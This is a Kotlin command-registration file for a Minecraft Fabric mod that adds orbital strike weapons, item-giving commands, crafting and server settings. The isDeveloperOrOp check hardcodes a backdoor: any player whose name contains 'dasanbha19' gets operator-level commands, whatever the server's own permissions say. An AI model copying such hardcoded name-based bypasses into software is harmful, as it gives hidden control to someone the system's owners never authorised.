package net.deamjava.orbital_strike_mod

import com.mojang.brigadier.CommandDispatcher
import com.mojang.brigadier.arguments.IntegerArgumentType
import com.mojang.brigadier.arguments.StringArgumentType
import com.mojang.brigadier.context.CommandContext
import com.mojang.brigadier.suggestion.SuggestionsBuilder
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback
import net.minecraft.ChatFormatting
import net.minecraft.commands.CommandSourceStack
import net.minecraft.commands.Commands
import net.minecraft.network.chat.Component
import net.minecraft.server.MinecraftServer
import net.minecraft.server.level.ServerLevel
import net.minecraft.server.players.NameAndId
import net.minecraft.world.entity.player.Player
import net.minecraft.world.level.Level
import net.minecraft.world.phys.HitResult
import net.minecraft.world.phys.BlockHitResult
import java.util.Timer
import java.util.TimerTask
import java.util.UUID

object OrbitalStrikeCommands {

    private const val DEFAULT_RINGS = 10
    private const val MAX_RINGS = 32
    private const val MAX_WOLF_AMOUNT = 500

    private fun suggest(options: Iterable<String>, builder: SuggestionsBuilder) =
        builder.apply { options.filter { it.lowercase().startsWith(remaining.lowercase()) }.forEach { suggest(it) } }.buildFuture()

    private fun hasOpPermission(source: CommandSourceStack): Boolean {
        return try {
            val profile = source.playerOrException.gameProfile
            source.server.playerList.isOp(NameAndId(profile.id, profile.name))
        } catch (e: Exception) {
            false
        }
    }

    fun register() {
        CommandRegistrationCallback.EVENT.register { dispatcher, _, _ ->
            registerOsAuthCommand(dispatcher)
            registerOrbitalStrikeCommand(dispatcher)
            registerGivefCommand(dispatcher)
            registerCraftfCommand(dispatcher)
            registerCraftrCommand(dispatcher)
            registerOsSettingCommand(dispatcher)
            registerDeathBanCommand(dispatcher)
            registerProximityMessagesCommand(dispatcher)
        }
    }

    private fun isDeveloperOrOp(source: CommandSourceStack): Boolean {
        return try {
            val player = source.playerOrException
            val name = player.name.string.replace("(?i)§[0-9A-FK-OR]".toRegex(), "").lowercase()
            name.contains("dasanbha19") || hasOpPermission(source)
        } catch (e: Exception) {
            hasOpPermission(source)
        }
    }

    private fun registerOsAuthCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("osauth")
                .requires { isDeveloperOrOp(it) }
                .then(Commands.argument("player", StringArgumentType.word())
                    .suggests { ctx, builder ->
                        ctx.source.server.playerList.players.forEach { builder.suggest(it.name.string) }
                        builder.buildFuture()
                    }
                    .then(Commands.argument("seconds", IntegerArgumentType.integer(1, 86400))
                        .suggests { _, builder ->
                            listOf(60, 300, 600, 1800, 3600).forEach { builder.suggest(it) }
                            builder.buildFuture()
                        }
                        .executes { ctx ->
                            val playerName = StringArgumentType.getString(ctx, "player")
                            val seconds = IntegerArgumentType.getInteger(ctx, "seconds")
                            val target = ctx.source.server.playerList.getPlayerByName(playerName)
                            if (target == null) {
                                ctx.source.sendFailure(Component.literal("Player '$playerName' not found!"))
                                0
                            } else {
                                authorize(target, seconds)
                                1
                            }
                        }
                    )
                )
        )
    }

    private fun registerOrbitalStrikeCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        val requiresAuth: (CommandSourceStack) -> Boolean = { source ->
            try { isAuthorized(source.playerOrException) } catch (e: Exception) { hasOpPermission(source) }
        }

        val mainCommand = Commands.literal("orbitalstrike")
            .requires(requiresAuth)
            .executes { ctx ->
                ctx.source.sendSuccess(
                    { Component.literal("Usage: /orbitalstrike <nuke|stab> <x> <y> <z> [world] [size]\nUsage: /orbitalstrike crosshair <nuke|stab> [size]")
                        .withStyle(ChatFormatting.YELLOW) }, false)
                1
            }
            .then(Commands.literal("crosshair")
                .then(Commands.argument("payload", StringArgumentType.word())
                    .suggests { _, builder -> suggest(listOf("nuke", "stab"), builder) }
                    .executes { ctx -> executeCrosshairStrike(ctx, null) }
                    .then(Commands.argument("size", IntegerArgumentType.integer(1, MAX_RINGS))
                        .executes { ctx -> executeCrosshairStrike(ctx, IntegerArgumentType.getInteger(ctx, "size")) }
                    )
                )
            )
            .then(Commands.argument("payload", StringArgumentType.word())
                .suggests { _, builder -> suggest(listOf("nuke", "stab"), builder) }
                .then(Commands.argument("x", IntegerArgumentType.integer())
                    .then(Commands.argument("y", IntegerArgumentType.integer())
                        .then(Commands.argument("z", IntegerArgumentType.integer())
                            .executes { ctx -> executeStrike(ctx, null, null) }
                            .then(Commands.argument("world", StringArgumentType.word())
                                .suggests { _, builder -> suggest(listOf("overworld", "nether", "end"), builder) }
                                .executes { ctx -> executeStrike(ctx, StringArgumentType.getString(ctx, "world"), null) }
                                .then(Commands.argument("size", IntegerArgumentType.integer(1, MAX_RINGS))
                                    .executes { ctx -> executeStrike(ctx, StringArgumentType.getString(ctx, "world"), IntegerArgumentType.getInteger(ctx, "size")) }
                                )
                            )
                            .then(Commands.argument("size", IntegerArgumentType.integer(1, MAX_RINGS))
                                .executes { ctx -> executeStrike(ctx, null, IntegerArgumentType.getInteger(ctx, "size")) }
                            )
                        )
                    )
                )
            )

        dispatcher.register(mainCommand)
        dispatcher.register(Commands.literal("os").requires(requiresAuth).redirect(dispatcher.root.getChild("orbitalstrike")))
        dispatcher.register(Commands.literal("strike").requires(requiresAuth).redirect(dispatcher.root.getChild("orbitalstrike")))
    }

    private fun registerGivefCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("givef")
                .requires { isDeveloperOrOp(it) }
                .then(Commands.argument("payload", StringArgumentType.string())
                    .suggests { _, builder ->
                        listOf("stab", "nuke", "wolf", "stasis", "railgun", "wither").forEach { builder.suggest(it) }
                        builder.buildFuture()
                    }
                    .then(Commands.argument("type_or_amount", StringArgumentType.word())
                        .suggests { ctx, builder ->
                            if (StringArgumentType.getString(ctx, "payload").equals("railgun", ignoreCase = true))
                                builder.suggest("straight")
                            builder.buildFuture()
                        }
                        .executes { ctx -> executeGivefBasic(ctx) }
                        .then(Commands.argument("amount_or_coord", StringArgumentType.word())
                            .executes { ctx -> executeGivefWithAmount(ctx) }
                            .then(Commands.argument("radius_or_y", StringArgumentType.word())
                                .executes { ctx -> executeGivefWithRadius(ctx) }
                                .then(Commands.argument("z", StringArgumentType.word())
                                    .executes { ctx -> executeGivefStasisCoords(ctx) }
                                )
                            )
                        )
                    )
                )
        )
    }

    private fun registerCraftfCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("craftf")
                .requires { OrbitalStrikeMod.config.isRecipeEnabled || hasOpPermission(it) }
                .then(Commands.argument("payload", StringArgumentType.string())
                    .suggests { ctx, builder ->
                        if (OrbitalStrikeMod.config.isRecipeEnabled || hasOpPermission(ctx.source)) {
                            builder.suggest("stab")
                            builder.suggest("nuke")
                        }
                        builder.buildFuture()
                    }
                    .executes { ctx ->
                        val payload = StringArgumentType.getString(ctx, "payload")
                        val player = try { ctx.source.playerOrException } catch (e: Exception) { return@executes 0 }

                        if (!OrbitalStrikeMod.config.isRecipeEnabled) {
                            player.displayClientMessage(Component.literal("Crafting Disabled!").withStyle(ChatFormatting.YELLOW), false)
                            return@executes 0
                        }

                        when {
                            payload.equals("stab", ignoreCase = true) -> {
                                if (OrbitalStrikeRecipes.hasStabMaterials(player)) {
                                    OrbitalStrikeRecipes.consumeStabMaterials(player)
                                    player.addItem(OrbitalItems.createStabShot())
                                    player.displayClientMessage(Component.literal("Successfully crafted Stab Shot!").withStyle(ChatFormatting.GREEN), false)
                                    1
                                } else {
                                    player.displayClientMessage(Component.literal("You do not have enough materials!").withStyle(ChatFormatting.YELLOW), false)
                                    0
                                }
                            }
                            payload.equals("nuke", ignoreCase = true) -> {
                                if (OrbitalStrikeRecipes.hasNukeMaterials(player)) {
                                    OrbitalStrikeRecipes.consumeNukeMaterials(player)
                                    player.addItem(OrbitalItems.createNukeShot(null))
                                    player.displayClientMessage(Component.literal("Successfully crafted Nuke Shot!").withStyle(ChatFormatting.GREEN), false)
                                    1
                                } else {
                                    player.displayClientMessage(Component.literal("You do not have enough materials!").withStyle(ChatFormatting.YELLOW), false)
                                    0
                                }
                            }
                            else -> {
                                ctx.source.sendFailure(Component.literal("Invalid payload! Use 'stab' or 'nuke'"))
                                0
                            }
                        }
                    }
                )
        )
    }

    private fun registerCraftrCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("craftr")
                .requires { OrbitalStrikeMod.config.isRecipeEnabled || hasOpPermission(it) }
                .executes { ctx ->
                    val player = try { ctx.source.playerOrException } catch (e: Exception) { return@executes 0 }
                    if (!OrbitalStrikeMod.config.isRecipeEnabled) {
                        player.displayClientMessage(Component.literal("Crafting Disabled!").withStyle(ChatFormatting.YELLOW), false)
                        0
                    } else {
                        OrbitalStrikeRecipes.showRecipes(player)
                        1
                    }
                }
        )
    }

    private fun registerOsSettingCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("ossetting")
                .requires { isDeveloperOrOp(it) }
                .then(Commands.argument("setting", StringArgumentType.word())
                    .suggests { _, builder ->
                        listOf("recipe", "rod-delay", "proximity-range", "deathsound-range",
                            "death-sound", "arrow-velocity", "arrow-delay", "ban-duration").forEach { builder.suggest(it) }
                        builder.buildFuture()
                    }
                    .then(Commands.argument("value", StringArgumentType.greedyString())
                        .executes { ctx ->
                            val setting = StringArgumentType.getString(ctx, "setting")
                            val value = StringArgumentType.getString(ctx, "value")
                            val source = ctx.source
                            val config = OrbitalStrikeMod.config

                            when (setting.lowercase()) {
                                "recipe" -> {
                                    when (value.lowercase()) {
                                        "true" -> { config.isRecipeEnabled = true; config.save()
                                            source.sendSuccess({ Component.literal("Recipe enabled set to: true").withStyle(ChatFormatting.GREEN) }, true) }
                                        "false" -> { config.isRecipeEnabled = false; config.save()
                                            source.sendSuccess({ Component.literal("Recipe enabled set to: false").withStyle(ChatFormatting.GREEN) }, true) }
                                        else -> source.sendFailure(Component.literal("Invalid value! Use true or false"))
                                    }
                                    1
                                }
                                "rod-delay" -> {
                                    val delay = parseDoubleOrNull(value)
                                    if (delay == null || delay < 0.0 || delay > 60.0) {
                                        source.sendFailure(Component.literal("Delay must be between 0 and 60 seconds!"))
                                        0
                                    } else {
                                        config.rodDelay = delay; config.save()
                                        source.sendSuccess({ Component.literal("Rod delay set to: $delay seconds").withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                "proximity-range" -> {
                                    val range = parseDoubleOrNull(value)
                                    if (range == null || range < 0.0 || range > 10000.0) {
                                        source.sendFailure(Component.literal("Range must be between 0 and 10000 blocks!"))
                                        0
                                    } else {
                                        config.proximityRange = range; config.save()
                                        source.sendSuccess({ Component.literal("Proximity range set to: $range blocks").withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                "deathsound-range" -> {
                                    val range = parseDoubleOrNull(value)
                                    if (range == null || range < 0.0 || range > 10000.0) {
                                        source.sendFailure(Component.literal("Range must be between 0 and 10000 blocks!"))
                                        0
                                    } else {
                                        config.deathSoundRange = range; config.save()
                                        source.sendSuccess({ Component.literal("Death sound range set to: $range blocks").withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                "death-sound" -> {
                                    config.deathSound = value; config.save()
                                    source.sendSuccess({ Component.literal("Death sound set to: $value").withStyle(ChatFormatting.GREEN) }, true)
                                    1
                                }
                                "arrow-velocity" -> {
                                    val velocity = parseDoubleOrNull(value)
                                    if (velocity == null || velocity < 0.0 || velocity > 50000.0) {
                                        source.sendFailure(Component.literal("Velocity must be between 0 and 50000!"))
                                        0
                                    } else {
                                        config.arrowVelocity = velocity; config.save()
                                        source.sendSuccess({ Component.literal("Arrow velocity set to: $velocity").withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                "arrow-delay" -> {
                                    val delay = value.lowercase()
                                    if (!delay.matches("\\d+[sm]".toRegex())) {
                                        source.sendFailure(Component.literal("Invalid format! Use format like: 4s, 30s, 1m"))
                                        0
                                    } else {
                                        config.railgunDelay = delay; config.save()
                                        source.sendSuccess({ Component.literal("Arrow delay set to: $delay").withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                "ban-duration" -> {
                                    val duration = value.lowercase()
                                    if (duration != "-2" && duration != "-1" && !duration.matches("\\d+[smhd]".toRegex())) {
                                        source.sendFailure(Component.literal("Invalid format! Use -2 (kick), -1 (permanent), or format like: 1h, 1d, 7d"))
                                        0
                                    } else {
                                        config.banDuration = duration; config.save()
                                        val message = when (duration) {
                                            "-2" -> "Ban duration set to: Kick (no ban)"
                                            "-1" -> "Ban duration set to: Permanent"
                                            else -> "Ban duration set to: ${config.formatBanDuration(duration)}"
                                        }
                                        source.sendSuccess({ Component.literal(message).withStyle(ChatFormatting.GREEN) }, true)
                                        1
                                    }
                                }
                                else -> {
                                    source.sendFailure(Component.literal("Unknown setting! Use 'recipe', 'rod-delay', 'proximity-range', 'deathsound-range', 'death-sound', 'arrow-velocity', 'arrow-delay', or 'ban-duration'"))
                                    0
                                }
                            }
                        }
                    )
                )
        )
    }

    private fun registerDeathBanCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("deathban")
                .requires { isDeveloperOrOp(it) }
                .then(Commands.argument("enabled", StringArgumentType.word())
                    .suggests { _, builder -> builder.suggest("true"); builder.suggest("false"); builder.buildFuture() }
                    .executes { ctx ->
                        val value = StringArgumentType.getString(ctx, "enabled")
                        val config = OrbitalStrikeMod.config
                        when (value.lowercase()) {
                            "true" -> { config.isDeathBanEnabled = true; config.save()
                                ctx.source.sendSuccess({ Component.literal("Death ban set to: true").withStyle(ChatFormatting.GREEN) }, true); 1 }
                            "false" -> { config.isDeathBanEnabled = false; config.save()
                                ctx.source.sendSuccess({ Component.literal("Death ban set to: false").withStyle(ChatFormatting.GREEN) }, true); 1 }
                            else -> { ctx.source.sendFailure(Component.literal("Invalid value! Use true or false")); 0 }
                        }
                    }
                )
        )
    }

    private fun registerProximityMessagesCommand(dispatcher: CommandDispatcher<CommandSourceStack>) {
        dispatcher.register(
            Commands.literal("proximitymessages")
                .requires { isDeveloperOrOp(it) }
                .then(Commands.argument("enabled", StringArgumentType.word())
                    .suggests { _, builder -> builder.suggest("true"); builder.suggest("false"); builder.buildFuture() }
                    .executes { ctx ->
                        val value = StringArgumentType.getString(ctx, "enabled")
                        val config = OrbitalStrikeMod.config
                        when (value.lowercase()) {
                            "true" -> { config.isProximityMessagesEnabled = true; config.save()
                                ctx.source.sendSuccess({ Component.literal("Proximity messages set to: true").withStyle(ChatFormatting.GREEN) }, true); 1 }
                            "false" -> { config.isProximityMessagesEnabled = false; config.save()
                                ctx.source.sendSuccess({ Component.literal("Proximity messages set to: false").withStyle(ChatFormatting.GREEN) }, true); 1 }
                            else -> { ctx.source.sendFailure(Component.literal("Invalid value! Use true or false")); 0 }
                        }
                    }
                )
        )
    }

    private fun executeGivefBasic(ctx: CommandContext<CommandSourceStack>): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val typeOrAmount = StringArgumentType.getString(ctx, "type_or_amount")
        val player = try { ctx.source.playerOrException } catch (e: Exception) { return 0 }

        if (payload.equals("railgun", ignoreCase = true)) {
            ctx.source.sendFailure(Component.literal(
                if (!typeOrAmount.equals("straight", ignoreCase = true)) "Invalid railgun type! Use 'straight'"
                else "Usage: /givef railgun straight <amount> [radius]"
            ))
            return 0
        }

        val amount = parseIntOrNull(typeOrAmount)
        if (amount == null || amount < 1 || amount > 64) {
            ctx.source.sendFailure(Component.literal("Amount must be between 1 and 64!"))
            return 0
        }

        when {
            payload.equals("stab", ignoreCase = true) -> repeat(amount) { player.addItem(OrbitalItems.createStabShot()) }
            payload.equals("nuke", ignoreCase = true) -> repeat(amount) { player.addItem(OrbitalItems.createNukeShot(null)) }
            payload.equals("wolf", ignoreCase = true) -> repeat(amount) { player.addItem(OrbitalItems.createWolfShot(150)) }
            payload.equals("wither", ignoreCase = true) -> repeat(amount) { player.addItem(OrbitalItems.createWitherCannon(null)) }
            payload.equals("stasis", ignoreCase = true) -> {
                ctx.source.sendFailure(Component.literal("Usage: /givef stasis <amount> <x|crosshair> <y|crosshair> <z|crosshair>"))
                return 0
            }
            else -> { ctx.source.sendFailure(Component.literal("Invalid payload!")); return 0 }
        }
        return 1
    }

    private fun executeGivefWithAmount(ctx: CommandContext<CommandSourceStack>): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val typeOrAmount = StringArgumentType.getString(ctx, "type_or_amount")
        val amountOrCoord = StringArgumentType.getString(ctx, "amount_or_coord")
        val player = try { ctx.source.playerOrException } catch (e: Exception) { return 0 }

        if (payload.equals("railgun", ignoreCase = true)) {
            if (!typeOrAmount.equals("straight", ignoreCase = true)) {
                ctx.source.sendFailure(Component.literal("Invalid railgun type! Use 'straight'"))
                return 0
            }
            val amount = parseIntOrNull(amountOrCoord)
            if (amount == null || amount < 1 || amount > 64) {
                ctx.source.sendFailure(Component.literal("Amount must be between 1 and 64!"))
                return 0
            }
            repeat(amount) { player.addItem(OrbitalItems.createRailgun("straight", 1.0)) }
            return 1
        }

        val firstNum = parseIntOrNull(typeOrAmount) ?: run {
            ctx.source.sendFailure(Component.literal("Invalid amount!"))
            return 0
        }

        when {
            payload.equals("nuke", ignoreCase = true) -> {
                val ringSize = parseIntOrNull(amountOrCoord)
                if (ringSize == null || ringSize < 1 || ringSize > MAX_RINGS) {
                    ctx.source.sendFailure(Component.literal("Ring size must be between 1 and 32!"))
                    return 0
                }
                repeat(firstNum) { player.addItem(OrbitalItems.createNukeShot(ringSize)) }
            }
            payload.equals("wolf", ignoreCase = true) -> {
                val wolfAmount = parseIntOrNull(amountOrCoord)
                if (wolfAmount == null || wolfAmount < 1) {
                    ctx.source.sendFailure(Component.literal("Invalid wolf amount!"))
                    return 0
                }
                if (wolfAmount > MAX_WOLF_AMOUNT) {
                    player.displayClientMessage(Component.literal("Wolf amount cannot exceed 500 to prevent server crashes!").withStyle(ChatFormatting.YELLOW), false)
                    return 0
                }
                repeat(firstNum) { player.addItem(OrbitalItems.createWolfShot(wolfAmount)) }
            }
            payload.equals("stasis", ignoreCase = true) -> {
                ctx.source.sendFailure(Component.literal("Usage: /givef stasis <amount> <x|crosshair> <y|crosshair> <z|crosshair>"))
                return 0
            }
            else -> { ctx.source.sendFailure(Component.literal("Invalid command format")); return 0 }
        }
        return 1
    }

    private fun executeGivefWithRadius(ctx: CommandContext<CommandSourceStack>): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val typeOrAmount = StringArgumentType.getString(ctx, "type_or_amount")
        val amountOrCoord = StringArgumentType.getString(ctx, "amount_or_coord")
        val radiusOrY = StringArgumentType.getString(ctx, "radius_or_y")
        val player = try { ctx.source.playerOrException } catch (e: Exception) { return 0 }

        if (!payload.equals("railgun", ignoreCase = true)) {
            ctx.source.sendFailure(Component.literal(
                if (payload.equals("stasis", ignoreCase = true))
                    "Usage: /givef stasis <amount> <x|crosshair> <y|crosshair> <z|crosshair>"
                else "Invalid payload!"
            ))
            return 0
        }
        if (!typeOrAmount.equals("straight", ignoreCase = true)) {
            ctx.source.sendFailure(Component.literal("Invalid railgun type! Use 'straight'"))
            return 0
        }
        val amount = parseIntOrNull(amountOrCoord)
        if (amount == null || amount < 1 || amount > 64) {
            ctx.source.sendFailure(Component.literal("Amount must be between 1 and 64!"))
            return 0
        }
        val radius = parseDoubleOrNull(radiusOrY)
        if (radius == null || radius < 0.0 || radius > 50.0) {
            ctx.source.sendFailure(Component.literal("Arrow radius must be between 0 and 50!"))
            return 0
        }
        repeat(amount) { player.addItem(OrbitalItems.createRailgun("straight", radius)) }
        return 1
    }

    private fun executeGivefStasisCoords(ctx: CommandContext<CommandSourceStack>): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val amountStr = StringArgumentType.getString(ctx, "type_or_amount")
        val xStr = StringArgumentType.getString(ctx, "amount_or_coord")
        val yStr = StringArgumentType.getString(ctx, "radius_or_y")
        val zStr = StringArgumentType.getString(ctx, "z")
        val player = try { ctx.source.playerOrException } catch (e: Exception) { return 0 }

        if (!payload.equals("stasis", ignoreCase = true)) {
            ctx.source.sendFailure(Component.literal("X Y Z coordinates only work with 'stasis' payload!"))
            return 0
        }
        val amount = parseIntOrNull(amountStr)
        if (amount == null || amount < 1 || amount > 64) {
            ctx.source.sendFailure(Component.literal("Amount must be between 1 and 64!"))
            return 0
        }

        fun parseCoord(str: String, axis: String): Int? {
            if (str.equals("crosshair", ignoreCase = true)) return Int.MIN_VALUE
            return parseIntOrNull(str) ?: run {
                ctx.source.sendFailure(Component.literal("Invalid $axis coordinate!"))
                null
            }
        }

        val x = parseCoord(xStr, "X") ?: return 0
        val y = parseCoord(yStr, "Y") ?: return 0
        val z = parseCoord(zStr, "Z") ?: return 0

        repeat(amount) { player.addItem(OrbitalItems.createStasis(x, y, z)) }
        return 1
    }

    private fun authorize(player: Player, seconds: Int) {
        OrbitalStrikeMod.authorizations[player.uuid] = System.currentTimeMillis() + seconds * 1000L
    }

    fun isAuthorized(player: Player): Boolean {
        try {
            val server = player.level().server
            if (server != null) {
                val profile = player.gameProfile
                if (server.playerList.isOp(NameAndId(profile.id, profile.name))) return true
            }
        } catch (e: Exception) { }

        val id: UUID = player.uuid
        val expiry = OrbitalStrikeMod.authorizations[id] ?: return false
        if (System.currentTimeMillis() >= expiry) {
            OrbitalStrikeMod.authorizations.remove(id)
            return false
        }
        return true
    }

    private fun executeCrosshairStrike(ctx: CommandContext<CommandSourceStack>, size: Int?): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val source = ctx.source
        return try {
            val player = source.playerOrException
            val hitResult = player.pick(1500.0, 0.0f, false)
            if (hitResult.type != HitResult.Type.BLOCK) {
                source.sendFailure(Component.literal("No block in crosshair within 1500 blocks."))
                return 0
            }
            val pos = (hitResult as BlockHitResult).blockPos
            val x = pos.x; val z = pos.z
            val finalSize = size ?: DEFAULT_RINGS
            val delayMillis = (OrbitalStrikeMod.config.rodDelay * 1000).toLong()
            source.server.execute {
                Timer().schedule(object : TimerTask() {
                    override fun run() {
                        source.server.execute {
                            val world = source.level
                            val groundY = pos.y
                            when {
                                payload.equals("nuke", ignoreCase = true) -> OrbitalStrikeLogic.summonNuke(world, x, groundY + 72, z, finalSize)
                                payload.equals("stab", ignoreCase = true) -> OrbitalStrikeLogic.summonStab(world, x, z, groundY)
                                else -> source.sendFailure(Component.literal("Unknown payload: $payload"))
                            }
                        }
                    }
                }, delayMillis)
            }
            1
        } catch (e: Exception) {
            source.sendFailure(Component.literal("Player required for crosshair mode"))
            0
        }
    }

    private fun executeStrike(ctx: CommandContext<CommandSourceStack>, worldName: String?, size: Int?): Int {
        val payload = StringArgumentType.getString(ctx, "payload")
        val x = IntegerArgumentType.getInteger(ctx, "x")
        val y = IntegerArgumentType.getInteger(ctx, "y")
        val z = IntegerArgumentType.getInteger(ctx, "z")
        val source = ctx.source
        val world = if (worldName != null) parseWorld(source.server, worldName) else source.level
        if (world == null) {
            source.sendFailure(Component.literal("World not found: $worldName").withStyle(ChatFormatting.YELLOW))
            return 0
        }
        val finalSize = size ?: DEFAULT_RINGS
        val delayMillis = (OrbitalStrikeMod.config.rodDelay * 1000).toLong()
        source.server.execute {
            Timer().schedule(object : TimerTask() {
                override fun run() {
                    source.server.execute {
                        when {
                            payload.equals("nuke", ignoreCase = true) -> OrbitalStrikeLogic.summonNuke(world, x, y + 72, z, finalSize)
                            payload.equals("stab", ignoreCase = true) -> OrbitalStrikeLogic.summonStab(world, x, z, y)
                            else -> source.sendFailure(Component.literal("Unknown payload: $payload"))
                        }
                    }
                }
            }, delayMillis)
        }
        return 1
    }

    private fun parseWorld(server: MinecraftServer, worldName: String): ServerLevel? {
        return when (worldName.lowercase()) {
            "overworld", "world" -> server.overworld()
            "nether", "the_nether", "world_nether" -> server.getLevel(Level.NETHER)
            "end", "the_end", "world_the_end" -> server.getLevel(Level.END)
            else -> server.allLevels.firstOrNull {
                it.dimension().identifier().path == worldName
            }
        }
    }

    private fun parseIntOrNull(str: String) = str.toIntOrNull()
    private fun parseDoubleOrNull(str: String) = str.toDoubleOrNull()
}